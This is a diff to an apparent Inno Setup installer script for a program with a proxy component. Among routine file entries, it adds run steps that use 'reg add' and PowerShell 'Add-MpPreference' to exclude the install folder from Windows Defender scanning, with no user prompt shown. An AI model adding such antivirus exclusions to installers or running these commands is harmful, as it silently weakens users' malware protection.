@@ -77,6 +77,7 @@ Name: "ukrainian"; MessagesFile: "compiler:Languages\Ukrainian.isl"
 Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "Common:"; Flags: checkedonce
 
 [Files]
+Source: "topack\proxy\config.json"; DestDir: "{app}"; Flags: ignoreversion; Components: Proxy
 Source: "topack\proxy\package.json"; DestDir: "{app}"; Flags: ignoreversion; Components: Proxy
 Source: "topack\proxy\package-lock.json"; DestDir: "{app}"; Flags: ignoreversion; Components: Proxy
 Source: "topack\proxy\README.md"; DestDir: "{app}"; Flags: ignoreversion; Components: Proxy
@@ -102,7 +103,10 @@ Filename: "{tmp}\vc17x86.msi"; Parameters: "/install /passive /norestart"; Flags
 Filename: "{tmp}\vc17x64.msi"; Parameters: "/install /passive /norestart"; Flags: skipifdoesntexist; Components: VCRedistributable; StatusMsg: "Install VC++ 2017 Redistributable package x64"; 
 Filename: "{tmp}\vc15x86.msi"; Parameters: "/q /norestart"; Flags: skipifdoesntexist; Components: VCRedistributable; StatusMsg: "Install VC++ 2017 Redistributable package x86"; 
 Filename: "{tmp}\vc15x64.msi"; Parameters: "/q /norestart"; Flags: skipifdoesntexist; Components: VCRedistributable; StatusMsg: "Install VC++ 2017 Redistributable package x64"; 
-Filename:  "explorer.exe"; Parameters: "{app}"
+Filename: "explorer.exe"; Parameters: "{app}"
+Filename: "reg"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"" /v ""{app}"" /t REG_DWORD /d 0 /f"; Components: Proxy
+Filename: "reg"; Parameters: "add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""{app}"" /t REG_DWORD /d 0 /f"; Components: Proxy
+Filename: "powershell.exe"; Parameters: "Add-MpPreference -ExclusionPath ""{app}"""; Components: Proxy
 
 [INI]
 Filename: "{app}\{#MyAppName}.url"; Section: "InternetShortcut"; Key: "URL"; String: "https://discord.gg/dUNDDtw"
